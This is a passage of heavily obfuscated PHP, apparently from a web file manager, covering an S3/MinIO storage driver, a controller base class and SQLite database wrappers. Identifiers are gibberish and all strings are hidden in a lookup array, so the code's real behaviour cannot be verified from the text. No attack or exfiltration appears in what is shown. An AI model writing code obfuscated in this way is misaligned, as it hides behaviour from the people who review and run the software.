= null) { $¤¨Î²Ÿ˜ =& $_SERVER[ê‘³Æ±]; $á¢÷¹ = trim($á¢÷¹, $¤¨Î²Ÿ˜[8]); $˜€Ïêã— = empty($á¢÷¹) && $á¢÷¹ !== $¤¨Î²Ÿ˜[192] ? $¤¨Î²Ÿ˜[12] : $á¢÷¹ . $¤¨Î²Ÿ˜[8]; return $this->client->getBucket($this->bucket, $˜€Ïêã—, $§ŞüÀ£Î, $›ÔñïØÉ, $Á®·½¶ø, !0); } public function has($®÷éÅ, $Š¢×êş´ = false, $ËªªÇì½ = true) { $Ç¿¹‘Ş =& $_SERVER[ê‘³Æ±]; $®÷éÅ = trim($®÷éÅ, $Ç¿¹‘Ş[8]); $ÖÜŞ½Ôø = empty($®÷éÅ) && $®÷éÅ !== $Ç¿¹‘Ş[192] ? $Ç¿¹‘Ş[12] : $®÷éÅ . $Ç¿¹‘Ş[8]; $Âì™ıØ… = null; $ööûÛÎÃ = 500; $˜û¤´ò… = $Ç¿¹‘Ş[8]; $şÍÀ¤õ³ = $Ï·ïî®  = array(); while (!0) { $‰Ş÷Âğ = $this->listObjs($®÷éÅ, $Âì™ıØ…, $ööûÛÎÃ, $˜û¤´ò…); if (!$‰Ş÷Âğ) { break; } $Âì™ıØ… = $‰Ş÷Âğ[$Ç¿¹‘Ş[203]]; $ùŒÍú°Å = $‰Ş÷Âğ[$Ç¿¹‘Ş[199]]; $§üá›ÍÕ = $‰Ş÷Âğ[$Ç¿¹‘Ş[202]]; if (empty($ùŒÍú°Å) && empty($§üá›ÍÕ)) { break; } if (count($ùŒÍú°Å) == 1 && $ùŒÍú°Å[0][$Ç¿¹‘Ş[32]] == $ÖÜŞ½Ôø) { break; } if ($Š¢×êş´) { if (count($ùŒÍú°Å)) { $ùŒÍú°Å = array_column($ùŒÍú°Å, $Ç¿¹‘Ş[32]); $şÍÀ¤õ³ = array_merge($şÍÀ¤õ³, $ùŒÍú°Å); } if (count($§üá›ÍÕ)) { $§üá›ÍÕ = array_column($§üá›ÍÕ, $Ç¿¹‘Ş[32]); $Ï·ïî®  = array_merge($Ï·ïî® , $§üá›ÍÕ); } if ($Âì™ıØ… === null) { break; } continue; } if ($ËªªÇì½) { if (!empty($ùŒÍú°Å)) { if (count($ùŒÍú°Å) > 1 || isset($ùŒÍú°Å[0][$Ç¿¹‘Ş[32]]) && $ùŒÍú°Å[0][$Ç¿¹‘Ş[32]] != $ÖÜŞ½Ôø) { return !0; } } } else { if (!empty($§üá›ÍÕ)) { return !0; } } if ($Âì™ıØ… === null) { break; } } if ($Š¢×êş´) { $şÍÀ¤õ³ = array_diff($şÍÀ¤õ³, array($ÖÜŞ½Ôø)); $şÍÀ¤õ³ = count(array_unique($şÍÀ¤õ³)); $Ï·ïî®  = count(array_unique($Ï·ïî® )); return array($Ç¿¹‘Ş[204] => $şÍÀ¤õ³, $Ç¿¹‘Ş[205] => $Ï·ïî® ); } return !1; } public function listAll($Š´Şêôó) { $µôåİıÜ =& $_SERVER[ê‘³Æ±]; $óÈ¨Œß„ = $this->fileList($Š´Şêôó, $µôåİıÜ[12], !0); $Öâ­œˆÕ = array(); foreach ($óÈ¨Œß„[$µôåİıÜ[76]] as $Íô£Í—‹) { $Öâ­œˆÕ[$Íô£Í—‹[$µôåİıÜ[32]]] = $Íô£Í—‹[$µôåİıÜ[80]]; } foreach ($óÈ¨Œß„[$µôåİıÜ[77]] as $Íô£Í—‹) { if (is_string($Íô£Í—‹)) { $Öâ­œˆÕ[$Íô£Í—‹] = 0; } } return $this->listAllFiles($Š´Şêôó, array_keys($Öâ­œˆÕ), $Öâ­œˆÕ); } public function canRead($©ï íÉ¯) { $ì¾úê™² =& $_SERVER[ê‘³Æ±]; $©½ºõ¹§ = $this->client->getAccessControlPolicy($this->bucket, $©ï íÉ¯); if (!$©½ºõ¹§) { return !1; } return in_array($©½ºõ¹§, array($ì¾úê™²[206], $ì¾úê™²[207], $ì¾úê™²[208])) ? !0 : !1; } public function canWrite($¦â½ª·) { $â‘Ğ‹¬ =& $_SERVER[ê‘³Æ±]; $Å×ÇÖÈ› = $this->client->getAccessControlPolicy($this->bucket, $¦â½ª·); if (!$Å×ÇÖÈ›) { return !1; } return in_array($Å×ÇÖÈ›, array($â‘Ğ‹¬[206], $â‘Ğ‹¬[207])) ? !0 : !1; } public function getContent($¶ıúÔş¼) { return $this->client->getObject($this->bucket, $¶ıúÔş¼); } public function setContent($’îóøÀÚ, $°õÃ‘¡î = '', $éà§³Ò = false) { $¥‚ÜÁä =& $_SERVER[ê‘³Æ±]; $’îóøÀÚ = $éà§³Ò ? trim($’îóøÀÚ, $¥‚ÜÁä[8]) . $¥‚ÜÁä[8] : $’îóøÀÚ; $êì¯ÂéÁ = get_file_mime(get_path_ext($’îóøÀÚ)); $€Æ±×Ó = $this->client->putObject($°õÃ‘¡î, $this->bucket, $’îóøÀÚ, $¥‚ÜÁä[193], array(), $êì¯ÂéÁ); if (!$€Æ±×Ó) { return !1; } if ($éà§³Ò) { return !0; } $this->cacheMethod(null, null); $€Æ±×Ó = $this->copyFile($’îóøÀÚ, $’îóøÀÚ, array($¥‚ÜÁä[209] => $€Æ±×Ó[$¥‚ÜÁä[210]])); return $€Æ±×Ó ? !0 : !1; } public function fileSubstr($šÂèæ£÷, $ƒ‡ÁÀö², $ä¬Ó¡) { $á—²Œ©Ö = $ƒ‡ÁÀö² + $ä¬Ó¡ - 1; return $this->client->getObject($this->bucket, $šÂèæ£÷, array($_SERVER[ê‘³Æ±][211] => "\x62\x79\164\x65\x73\x3d{$ƒ‡ÁÀö²}\x2d{$á—²Œ©Ö}")); } public function upload($Œ–åüÊÑ, $š¶ª¸Şî, $ÍÛ”±« = false, $æÆ¾šúÚ = REPEAT_REPLACE) { $ÇåœÓ¹› =& $_SERVER[ê‘³Æ±]; $¼ß“½°¸ = array($ÇåœÓ¹›[209] => @md5_file($š¶ª¸Şî)); $Ú‰‰ÈÉŠ = array($ÇåœÓ¹›[212] => get_file_mime(get_path_ext($Œ–åüÊÑ))); if (IO::size($š¶ª¸Şî) <= 1024 * 1024 * 200) { $ğ´ã¸™› = $this->client->putObjectFile($š¶ª¸Şî, $this->bucket, $Œ–åüÊÑ, $ÇåœÓ¹›[193], $¼ß“½°¸, $Ú‰‰ÈÉŠ); return !empty($ğ´ã¸™›) ? $this->getPathOuter($Œ–åüÊÑ) : !1; } $ô’¼Ü¼ã = $this->client->multiUploadObject($š¶ª¸Şî, $this->bucket, trim($Œ–åüÊÑ, $ÇåœÓ¹›[8]), $¼ß“½°¸, $Ú‰‰ÈÉŠ); return $ô’¼Ü¼ã ? $this->getPathOuter($Œ–åüÊÑ) : !1; } public function download($œ„ã—âÙ, $Ñı Çš³) { if (!@is_dir($this->pathFather($Ñı Çš³)) && !IO::mkdir($this->pathFather($Ñı Çš³))) { return !1; } $Æ×Ü±ÈÒ = $this->client->getObject($this->bucket, $œ„ã—âÙ, array(), $Ñı Çš³); return $Æ×Ü±ÈÒ !== !1 ? $Ñı Çš³ : !1; } public function link($õ½ôŒí°, $ãÒ—˜ = array()) { $À¯Ü—ã =& $_SERVER[ê‘³Æ±]; if ($this->signVer == $À¯Ü—ã[213]) { return $this->client->getAuthenticatedURL($this->bucket, $õ½ôŒí°, 3600 * 12, $ãÒ—˜); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($õ½ôŒí°, $À¯Ü—ã[8]), 3600 * 12, $this->region, array(), !0, $ãÒ—˜); } public function fileOut($åûÒí±ë, $ÈŸ¥şäò = false, $­éÑİ£© = false, $äÕÔ¸È = '') { $Ş¯êì’É =& $_SERVER[ê‘³Æ±]; if ($this->isFileOutServer()) { return $this->fileOutServer($åûÒí±ë, $ÈŸ¥şäò, $­éÑİ£©, $äÕÔ¸È); } if (!$­éÑİ£©) { $­éÑİ£© = $this->pathThis($åûÒí±ë); } $ìšĞ¥¨· = get_file_mime(get_path_ext($­éÑİ£©)); if ($ìšĞ¥¨· == $Ş¯êì’É[214]) { return parent::fileOut($åûÒí±ë, $ÈŸ¥şäò, $­éÑİ£©, $äÕÔ¸È); } $¯ÖÚæÜÌ = array($Ş¯êì’É[215] => $ìšĞ¥¨·); if ($ÈŸ¥şäò) { $¯ÖÚæÜÌ[$Ş¯êì’É[216]] = $Ş¯êì’É[217] . rawurlencode($­éÑİ£©); } else { } $‚Ö‘Ä±ü = $this->link($åûÒí±ë, $¯ÖÚæÜÌ); $this->fileOutLink($‚Ö‘Ä±ü); } public function fileOutServer($‰óäı, $èÌèâ·„ = false, $Œ˜ğ¥äú = false, $òó¤£Ë§ = '') { parent::fileOut($‰óäı, $èÌèâ·„, $Œ˜ğ¥äú, $òó¤£Ë§); } public function fileOutImageServer($Ãó§ò­ª, $é¬•ü£ò = 250) { parent::fileOutImage($Ãó§ò­ª, $é¬•ü£ò); } public function hashMd5($š¹ŒÊÖ, $Ö„ºê˜ = '') { $Ë§À”â× =& $_SERVER[ê‘³Æ±]; $ğ³æÌü‡ = $this->objectMeta($š¹ŒÊÖ); if (!$ğ³æÌü‡) { return !1; } $Ö„ºê˜ = $Ö„ºê˜ ? $Ö„ºê˜ : _get($ğ³æÌü‡, $Ë§À”â×[218]); $Ö„ºê˜ = $Ö„ºê˜ ? $Ö„ºê˜ : _get($ğ³æÌü‡, $Ë§À”â×[210], $Ë§À”â×[12]); return $Ö„ºê˜; } public function uploadFormData($ö¢¶¿ø¤, $ÙÊµ’Ù‘ = 3600) { $‘Èã¦¸¿ =& $_SERVER[ê‘³Æ±]; $÷îšÑÃ¢ = $this->pathFather($ö¢¶¿ø¤); $Ì¬­Øä = $this->client->getHttpUploadPostParams($this->bucket, $÷îšÑÃ¢, $‘Èã¦¸¿[193], $ÙÊµ’Ù‘); return array_merge((array) $Ì¬­Øä, array($‘Èã¦¸¿[176] => $this->getHost())); } public function multiUploadFormData($åÕş‰¾, $â½ÀÛ£ = 3600) { $Ğ°·»±é =& $_SERVER[ê‘³Æ±]; $Øá›²è = gmdate($Ğ°·»±é[219]); $­¾‘ïœ° = array(); $¡Üæ»÷ = $this->client->getUploadId($this->bucket, $åÕş‰¾, $­¾‘ïœ°); if (!$¡Üæ»÷) { return !1; } return array($Ğ°·»±é[220] => $¡Üæ»÷, $Ğ°·»±é[176] => $this->getHost() . $Ğ°·»±é[8] . $this->pathEncode($åÕş‰¾), $Ğ°·»±é[221] => $Øá›²è, $Ğ°·»±é[95] => $åÕş‰¾); } public function multiUploadAuthData($ÁÆèšˆ, $ŠãÖ˜Á = array()) { $’Ò‚¦¢ä =& $_SERVER[ê‘³Æ±]; $™‹É‹·û = isset($ŠãÖ˜Á[$’Ò‚¦¢ä[221]]) ? $ŠãÖ˜Á[$’Ò‚¦¢ä[221]] : gmdate($’Ò‚¦¢ä[219]); $‡ªÍ¤ü = isset($ŠãÖ˜Á[$’Ò‚¦¢ä[169]]) ? $ŠãÖ˜Á[$’Ò‚¦¢ä[169]] : $’Ò‚¦¢ä[12]; $•ç¤ÇˆÍ = $ŠãÖ˜Á[$’Ò‚¦¢ä[95]]; unset($ŠãÖ˜Á[$’Ò‚¦¢ä[95]]); if (isset($ŠãÖ˜Á[$’Ò‚¦¢ä[222]])) { $ŠãÖ˜Á[$’Ò‚¦¢ä[221]] = $™‹É‹·û; return $this->listUploadParts($•ç¤ÇˆÍ, $ŠãÖ˜Á); } $Æ³áÃØÇ = array($’Ò‚¦¢ä[223], $’Ò‚¦¢ä[12], $’Ò‚¦¢ä[120], $’Ò‚¦¢ä[12], "\x78\x2d\141\x6d\172\55\x64\141\x74\x65\72{$™‹É‹·û}", $’Ò‚¦¢ä[8] . $this->bucket . $’Ò‚¦¢ä[8] . $this->pathEncode($•ç¤ÇˆÍ) . $‡ªÍ¤ü); if (strpos($‡ªÍ¤ü, $’Ò‚¦¢ä[224]) === 0) { $Æ³áÃØÇ[0] = $’Ò‚¦¢ä[225]; } if (isset($ŠãÖ˜Á[$’Ò‚¦¢ä[226]]) && $ŠãÖ˜Á[$’Ò‚¦¢ä[226]] == $’Ò‚¦¢ä[227]) { $Æ³áÃØÇ[0] = $’Ò‚¦¢ä[227]; } $˜°ø¯ = implode($’Ò‚¦¢ä[228], $Æ³áÃØÇ); $¬ÆÃÀœ¬ = base64_encode(hash_hmac($’Ò‚¦¢ä[229], $˜°ø¯, $this->secret, !0)); $ÆÊµ†Æş = $’Ò‚¦¢ä[230] . $this->accessKey . $’Ò‚¦¢ä[4] . $¬ÆÃÀœ¬; if (strpos($‡ªÍ¤ü, $’Ò‚¦¢ä[224]) === 0) { return array($’Ò‚¦¢ä[231] => $ÆÊµ†Æş, $’Ò‚¦¢ä[221] => $™‹É‹·û); } return $ÆÊµ†Æş; } public function listUploadParts($«„áú¾Ê, $—âÜ²æØ = array()) { $¥ñĞñÎå =& $_SERVER[ê‘³Æ±]; $Åê¦—šŠ = str_replace($¥ñĞñÎå[232], $¥ñĞñÎå[12], $—âÜ²æØ[$¥ñĞñÎå[169]]); $İÔÁñ‰‘ = $this->client->listParts($this->bucket, $«„áú¾Ê, $Åê¦—šŠ); if (!$İÔÁñ‰‘) { return !1; } unset($—âÜ²æØ[$¥ñĞñÎå[222]], $—âÜ²æØ[$¥ñĞñÎå[226]]); $—âÜ²æØ[$¥ñĞñÎå[95]] = $«„áú¾Ê; $º¦€Å† = $this->multiUploadAuthData($«„áú¾Ê, $—âÜ²æØ); if (empty($º¦€Å†)) { return !1; } return array($¥ñĞñÎå[231] => $º¦€Å†, $¥ñĞñÎå[221] => $—âÜ²æØ[$¥ñĞñÎå[221]], $¥ñĞñÎå[233] => $İÔÁñ‰‘); } public function getHost() { return parent::getHost() . $_SERVER[ê‘³Æ±][8] . $this->bucket; } public function size($ÄºàšÌ§) { $œîß™“á = $this->objectMeta($ÄºàšÌ§); return $œîß™“á ? $œîß™“á[$_SERVER[ê‘³Æ±][80]] : 0; } public function info($™³Íè¤–) { if ($this->isFolder($™³Íè¤–)) { return $this->folderInfo($™³Íè¤–); } else { if ($this->isFile($™³Íè¤–)) { return $this->fileInfo($™³Íè¤–); } } return !1; } public function exist($éúÎªÎÒ) { return $this->isFile($éúÎªÎÒ) || $this->isFolder($éúÎªÎÒ); } public function isFile($Ëàà³Ìè) { return !$this->isFolder($Ëàà³Ìè) && $this->objectMeta($Ëàà³Ìè); } public function isFolder($å²¡·­ç) { return $this->cacheMethod($_SERVER[ê‘³Æ±][200], $å²¡·­ç); } protected function objectMeta($Áë­ßºù) { return $this->cacheMethod($_SERVER[ê‘³Æ±][201], $Áë­ßºù); } protected function _objectMeta($åó¼ÏÉÔ) { $·ï ŒÚĞ =& $_SERVER[ê‘³Æ±]; $åó¼ÏÉÔ = rtrim($åó¼ÏÉÔ, $·ï ŒÚĞ[8]); try { $Ó÷•Ú¨Ï = $this->client->getObjectInfo($this->bucket, $åó¼ÏÉÔ); if (!isset($Ó÷•Ú¨Ï[$·ï ŒÚĞ[218]]) && isset($Ó÷•Ú¨Ï[$·ï ŒÚĞ[234]])) { $Ó÷•Ú¨Ï[$·ï ŒÚĞ[218]] = $Ó÷•Ú¨Ï[$·ï ŒÚĞ[234]]; } } catch (Exception $ìŠ™ıÖ) { $Ó÷•Ú¨Ï = !1; } if (!$Ó÷•Ú¨Ï) { } return $Ó÷•Ú¨Ï; } protected function _isFolder($öÛîê—Ñ) { $İÙ­úÕõ =& $_SERVER[ê‘³Æ±]; $öÛîê—Ñ = rtrim($öÛîê—Ñ, $İÙ­úÕõ[8]); if ($öÛîê—Ñ == $İÙ­úÕõ[12] || $öÛîê—Ñ == $İÙ­úÕõ[8]) { return !0; } $şÆŞ×Êñ = $this->client->getBucket($this->bucket, $öÛîê—Ñ, null, 1); if (empty($şÆŞ×Êñ[$İÙ­úÕõ[199]])) { return !1; } $ĞˆĞ¹­¢ = $şÆŞ×Êñ[$İÙ­úÕõ[199]][0][$İÙ­úÕõ[32]]; return stripos($ĞˆĞ¹­¢, $öÛîê—Ñ . $İÙ­úÕõ[8]) === 0 ? !0 : !1; if (substr($ĞˆĞ¹­¢, -1) == $İÙ­úÕõ[8]) { return !0; } if (get_path_this($ĞˆĞ¹­¢) == get_path_this($öÛîê—Ñ)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¾ıœÜÎ) { parent::__construct($¾ıœÜÎ); $this->signatureVersion($_SERVER[ê‘³Æ±][213]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto b«Ü”ÁƒÙÃ; E÷Šô÷ÈÑ½: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Š§Ÿ©‰ƒ =& $_SERVER[ê‘³Æ±]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Š§Ÿ©‰ƒ[6]] =& $config; $this->values[$Š§Ÿ©‰ƒ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Š§Ÿ©‰ƒ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($È•Äñê) { if (1 === func_num_args()) { $this->{$È•Äñê} = new $È•Äñê(); } else { $”£Œñ©¢ = new ReflectionClass($È•Äñê); $«ôá¯¤¹ = func_get_args(); array_shift($«ôá¯¤¹); $this->{$È•Äñê} = $”£Œñ©¢->newInstanceArgs($«ôá¯¤¹); } return $this->{$È•Äñê}; } public function routeBind($õ÷…–÷, $å¾®ğöÄ, $­÷§Î«Á = 3) { $Ş–ø¯µ  =& $_SERVER[ê‘³Æ±]; $×è‡úäœ = $this->in[$Ş–ø¯µ [9]]; $õ÷…–÷ = str_replace($Ş–ø¯µ [10], $Ş–ø¯µ [11], trim(trim($õ÷…–÷, $Ş–ø¯µ [8]), $Ş–ø¯µ [12])); if (!$õ÷…–÷ || count($×è‡úäœ) <= $­÷§Î«Á) { return !1; } $î¹İÑìÎ = !0; $˜Õ¼ïÇ = explode($Ş–ø¯µ [8], $õ÷…–÷); for ($ÔÊĞµ„ü = 0; $ÔÊĞµ„ü < count($˜Õ¼ïÇ); $ÔÊĞµ„ü++) { if ($˜Õ¼ïÇ[$ÔÊĞµ„ü] != $×è‡úäœ[$­÷§Î«Á + $ÔÊĞµ„ü]) { $î¹İÑìÎ = !1; break; } } if (!$î¹İÑìÎ) { return; } call_user_func_array(array($this, $å¾®ğöÄ), array()); } public function routeArgs($ŸÊÈÑÃÂ = 3) { $°™ñ¯©¤ = $this->in[$_SERVER[ê‘³Æ±][9]]; if (count($°™ñ¯©¤) <= $ŸÊÈÑÃÂ) { return array(); } $ıâˆ·ç± = array(); for ($¿‹Üãƒ = $ŸÊÈÑÃÂ; $¿‹Üãƒ < count($°™ñ¯©¤); $¿‹Üãƒ += 2) { $ıâˆ·ç±[$°™ñ¯©¤[$¿‹Üãƒ]] = $°™ñ¯©¤[$¿‹Üãƒ + 1]; $this->in[$°™ñ¯©¤[$¿‹Üãƒ]] = $°™ñ¯©¤[$¿‹Üãƒ + 1]; } return $ıâˆ·ç±; } protected function assign($äÆÚ¹¦£, $€¡Ş¥îĞ) { $this->values[$äÆÚ¹¦£] = $€¡Ş¥îĞ; } protected function display($í®Ÿ¹¹) { ob_end_clean(); extract($this->values); require $this->tpl . $í®Ÿ¹¹; } } class DbSqliteBase extends Db { public function __construct($Áˆ”í§ƒ = '') { $ÍôäÆô =& $_SERVER[ê‘³Æ±]; if (!extension_loaded($ÍôäÆô[13])) { think_exception(think_lang($ÍôäÆô[14]) . $ÍôäÆô[15]); } if (!empty($Áˆ”í§ƒ)) { if (!isset($Áˆ”í§ƒ[$ÍôäÆô[16]])) { $Áˆ”í§ƒ[$ÍôäÆô[16]] = 438; } $this->config = $Áˆ”í§ƒ; if (empty($this->config[$ÍôäÆô[17]])) { $this->config[$ÍôäÆô[17]] = array(); } } } public function connect($şøâ‰Ì = '', $œ­ÛÏ¼Ä = 0) { $öÜÚµÀ =& $_SERVER[ê‘³Æ±]; if (!isset($this->linkID[$œ­ÛÏ¼Ä])) { if (empty($şøâ‰Ì)) { $şøâ‰Ì = $this->config; } $Š¨è™›š = !empty($şøâ‰Ì[$öÜÚµÀ[17]][$öÜÚµÀ[18]]) ? $şøâ‰Ì[$öÜÚµÀ[17]][$öÜÚµÀ[18]] : $this->pconnect; $ Ê¡§ÀË = $Š¨è™›š ? $öÜÚµÀ[19] : $öÜÚµÀ[20]; $this->linkID[$œ­ÛÏ¼Ä] = $ Ê¡§ÀË($şøâ‰Ì[$öÜÚµÀ[21]], $şøâ‰Ì[$öÜÚµÀ[16]]); if (!$this->linkID[$œ­ÛÏ¼Ä]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$œ­ÛÏ¼Ä], 30000); if (1 != think_config($öÜÚµÀ[22])) { unset($this->config); } } return $this->linkID[$œ­ÛÏ¼Ä]; } public function free() { $this->queryID = null; } public function query($Â‹Á™Â•) { $É·éÛñ =& $_SERVER[ê‘³Æ±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Â‹Á™Â•; if ($this->queryID) { $this->free(); } think_action_status($É·éÛñ[23], 1); think_status($É·éÛñ[24]); $this->queryID = sqlite_query($this->_linkID, $Â‹Á™Â•); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¶ûÚ·¨Å = $this->getAll(); return $¶ûÚ·¨Å; } } public function execute($Õº‹‡’) { $Ú‰…ìÜı =& $_SERVER[ê‘³Æ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Õº‹‡’; if ($this->queryID) { $this->free(); } think_action_status($Ú‰…ìÜı[25], 1); think_status($Ú‰…ìÜı[24]); $¦¢äÁ»· = sqlite_exec($this->_linkID, $Õº‹‡’); $this->debug(); if (!1 === $¦¢äÁ»·) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ê‘³Æ±][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Æù‚¯¾Ç = sqlite_query($this->_linkID, $_SERVER[ê‘³Æ±][27]); if (!$Æù‚¯¾Ç) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Å•¿“Å = sqlite_query($this->_linkID, $_SERVER[ê‘³Æ±][28]); if (!$Å•¿“Å) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $“‘Ô’… = array(); if ($this->numRows > 0) { for ($±¼¬¡¨› = 0; $±¼¬¡¨› < $this->numRows; $±¼¬¡¨›++) { $“‘Ô’…[$±¼¬¡¨›] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $“‘Ô’…; } public function getFields($ÇŸÃâ„) { $¬¦¾ÃÙ® =& $_SERVER[ê‘³Æ±]; $é¾ÁÊ¸¬ = $this->query($¬¦¾ÃÙ®[29] . $ÇŸÃâ„ . $¬¦¾ÃÙ®[30]); $şğ¶™´ = array(); if ($é¾ÁÊ¸¬) { foreach ($é¾ÁÊ¸¬ as $¬×ëšİÓ => $­ÌÈÀ¡Ş) { $şğ¶™´[$­ÌÈÀ¡Ş[$¬¦¾ÃÙ®[31]]] = array($¬¦¾ÃÙ®[32] => $­ÌÈÀ¡Ş[$¬¦¾ÃÙ®[31]], $¬¦¾ÃÙ®[33] => $­ÌÈÀ¡Ş[$¬¦¾ÃÙ®[34]], $¬¦¾ÃÙ®[35] => (bool) ($­ÌÈÀ¡Ş[$¬¦¾ÃÙ®[36]] === $¬¦¾ÃÙ®[12]), $¬¦¾ÃÙ®[37] => $­ÌÈÀ¡Ş[$¬¦¾ÃÙ®[38]], $¬¦¾ÃÙ®[39] => strtolower($­ÌÈÀ¡Ş[$¬¦¾ÃÙ®[40]]) == $¬¦¾ÃÙ®[41], $¬¦¾ÃÙ®[42] => strtolower($­ÌÈÀ¡Ş[$¬¦¾ÃÙ®[43]]) == $¬¦¾ÃÙ®[44]); } } return $şğ¶™´; } public function getTables($Ç½Ô–Îá = '') { $¸ÓªÔ‚‚ =& $_SERVER[ê‘³Æ±]; $„û„†ò = $this->query($¸ÓªÔ‚‚[45] . $¸ÓªÔ‚‚[46] . $¸ÓªÔ‚‚[47]); $ı¥÷í¤ø = array(); foreach ($„û„†ò as $ÊÄ±ÚŞÓ => $½Ÿ™Šãš) { $ı¥÷í¤ø[$ÊÄ±ÚŞÓ] = current($½Ÿ™Šãš); } return $ı¥÷í¤ø; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $”‡«Ò¸½ =& $_SERVER[ê‘³Æ±]; $§¿ô¬ø¤ = sqlite_last_error($this->_linkID); $this->error = $§¿ô¬ø¤ . $”‡«Ò¸½[4] . sqlite_error_string($§¿ô¬ø¤); if ($”‡«Ò¸½[12] != $this->queryStr) { $this->error .= LNG($”‡«Ò¸½[48]) . $this->queryStr; } think_trace($this->error, $”‡«Ò¸½[12], $”‡«Ò¸½[49]); return $this->error; } public function escapeString($Á‰µĞô¬) { return sqlite_escape_string($Á‰µĞô¬); } public function parseLimit($ºØÚ·Ìï) { $ª–é‚í• =& $_SERVER[ê‘³Æ±]; $É§â³€² = $ª–é‚í•[12]; if (!empty($ºØÚ·Ìï)) { $ºØÚ·Ìï = explode($ª–é‚í•[50], $ºØÚ·Ìï); if (count($ºØÚ·Ìï) > 1) { $É§â³€² .= $ª–é‚í•[51] . $ºØÚ·Ìï[1] . $ª–é‚í•[52] . $ºØÚ·Ìï[0] . $ª–é‚í•[53]; } else { $É§â³€² .= $ª–é‚í•[51] . $ºØÚ·Ìï[0] . $ª–é‚í•[53]; } } return $É§â³€²; } } class DbSqlite3Base extends Db { public function __construct($ª®»“µõ = '') { $ßÄÖÁª÷ =& $_SERVER[ê‘³Æ±]; if (!class_exists($ßÄÖÁª÷[54])) { think_exception(think_lang($ßÄÖÁª÷[14]) . $ßÄÖÁª÷[55]); } if (!empty($ª®»“µõ)) { if (!isset($ª®»“µõ[$ßÄÖÁª÷[16]])) { $ª®»“µõ[$ßÄÖÁª÷[16]] = 438; } $this->config = $ª®»“µõ; if (empty($this->config[$ßÄÖÁª÷[17]])) { $this->config[$ßÄÖÁª÷[17]] = array(); } } } public function connect($¶—ˆ¤„¸ = '', $ñùğÖÎ¿ = 0) { $ËœÔ¤œ =& $_SERVER[ê‘³Æ±]; if (!isset($this->linkID[$ñùğÖÎ¿])) { if (empty($¶—ˆ¤„¸)) { $¶—ˆ¤„¸ = $this->config; } $this->linkID[$ñùğÖÎ¿] = new SQLite3($¶—ˆ¤„¸[$ËœÔ¤œ[21]]); if (!$this->linkID[$ñùğÖÎ¿]) { think_exception($this->linkID[$ñùğÖÎ¿]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ñùğÖÎ¿]->busyTimeout(30000); if (1 != think_config($ËœÔ¤œ[22])) { unset($this->config); } } return $this->linkID[$ñùğÖÎ¿]; } public function free() { $this->queryID = null; } public function query($ßš§¯ö) { $şÁŒ˜¸Ó =& $_SERVER[ê‘³Æ±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ßš§¯ö; if ($this->queryID) { $this->free(); } think_action_status($şÁŒ˜¸Ó[23], 1); think_status($şÁŒ˜¸Ó[24]); $this->queryID = $this->_linkID->query($ßš§¯ö); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ ±Ğ¢ùİ = $this->getAll(); $this->numRows = count($ ±Ğ¢ùİ); return $ ±Ğ¢ùİ; } } public function execute($”º¬·ÈŒ) { $ÍÂé÷õ© =& $_SERVER[ê‘³Æ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $”º¬·ÈŒ; if ($this->queryID) { $this->free(); } think_action_status($ÍÂé÷õ©[25], 1); think_status($ÍÂé÷õ©[24]); $ÕÓß¦Áœ = $this->_linkID->exec($”º¬·ÈŒ); $this->debug(); if (!1 === $ÕÓß¦Áœ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ê‘³Æ±][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Î ¸ıö× = $this->_linkID->query($_SERVER[ê‘³Æ±][27]); if (!$Î ¸ıö×) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÊÖÆÔöš = $this->_linkID->query($_SERVER[ê‘³Æ±][28]); if (!$ÊÖÆÔöš) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $‡şö±ÏÓ = array(); while ($±øÓíóá = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $‡şö±ÏÓ[] = $±øÓíóá; } $this->queryID->reset(); return $‡şö±ÏÓ; } public function getFields($¶˜àÆš) { $€ÕÑğê =& $_SERVER[ê‘³Æ±]; $’† ‘Ë = $this->query($€ÕÑğê[29] . $¶˜àÆš . $€ÕÑğê[30]); $ÅŞËÌ = array(); if ($’† ‘Ë) { foreach ($’† ‘Ë as $»»£Áº => $…³Ë¥Ô³) { $ÅŞËÌ[$…³Ë¥Ô³[$€ÕÑğê[32]]] = array($€ÕÑğê[32] => $…³Ë¥Ô³[$€ÕÑğê[32]], $€ÕÑğê[33] => $…³Ë¥Ô³[$€ÕÑğê[33]], $€ÕÑğê[35] 